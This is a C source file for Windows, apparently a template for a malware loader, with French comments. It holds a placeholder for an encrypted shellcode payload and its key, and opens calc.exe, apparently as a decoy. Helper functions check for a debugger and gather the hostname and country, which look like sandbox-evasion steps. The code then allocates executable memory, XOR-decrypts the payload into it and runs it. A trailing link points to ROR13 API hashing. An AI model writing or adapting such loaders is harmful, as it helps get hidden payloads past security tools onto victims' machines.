#include <windows.h>
#include "config.h"
#include <stdio.h>

__attribute__((section(".text"))) unsigned char msgbox_payload[] = "%SHELLCODE%";
void main() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
    int is_debugged = d();
    int size = z();
    char *hostname = h();
    char *country = c();

    char k[] = "%KEY%";
    size_t k_len = strlen(k);
    size_t ss = sizeof(msgbox_payload)-1;
    
    printf("is_debugged: %d\n", is_debugged);
    printf("hostname: %s\n", hostname);
    printf("size: %d\n", size);
    printf("country: %s\n", country);

    printf("Key: %s\n", k);
    printf("Key size: %zu\n", k_len);
    printf("Shellcode size: %zu\n", ss);

    // 🔴 1. Allouer une mémoire exécutable
    void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("❌ Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
        return;
    }

    // 🔵 2. Copier le shellcode dans cette mémoire
    memcpy(exec_mem, msgbox_payload, ss);

    // 🟢 3. Déchiffrer le shellcode avec XOR
    if (k_len != 0) {
        for (size_t i = 0; i < ss; ++i) {
            ((unsigned char*)exec_mem)[i] ^= k[i % k_len];
        }
    }

    // 🟣 4. Exécuter le shellcode
    ((void (*)())exec_mem)();
}

/*
https://asecuritysite.com/hash/ror13

*/

